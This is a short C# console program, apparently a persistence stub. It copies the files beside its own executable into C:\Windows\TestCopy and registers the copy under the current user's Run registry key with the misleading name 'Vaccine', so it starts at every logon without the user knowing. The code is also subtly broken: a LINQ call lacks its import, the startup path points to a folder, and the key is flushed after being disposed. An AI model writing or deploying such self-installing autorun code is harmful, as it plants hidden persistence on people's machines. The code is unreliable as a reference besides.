using Microsoft.Win32;
using System.IO;
using System.Windows.Forms;


namespace CopyAFile
{
    internal class CopyAFile
    {
        private static void Main(string[] args)
        {
            try
            {
                string sourceFile = Application.ExecutablePath.ToString();
                string Filename = System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;

                string input = sourceFile; string output = new string(input.ToCharArray().Reverse().ToArray());
                string source = output.Substring(Filename.Length);
                output = "";
                input = source; output = new string(input.ToCharArray().Reverse().ToArray());

                string[] files = Directory.GetFiles(output);
                string subPath = @"C:\Windows\TestCopy";
                bool exists = System.IO.Directory.Exists(subPath);
                if (!exists)
                    System.IO.Directory.CreateDirectory(subPath);

                foreach (string file in files)
                {
                    string filename = file.Substring(sourceFile.Length - Filename.Length - 1);
                    string total = subPath + filename;
                    File.Copy(file, total, true);
                }

                //var rk = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                string StartupItemPath = subPath + @"\" + Filename + @"\";
                Console.WriteLine(StartupItemPath);
                //rk.SetValue("Vaccine", StartupItemPath);

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("Vaccine", StartupItemPath);
                    key.Dispose();
                    key.Flush();
                }

                Console.WriteLine("finished");
                Console.ReadLine();
            }
            catch (Exception ex) 
            { 
                Console.WriteLine(ex.Message);
            }
        }
    }
}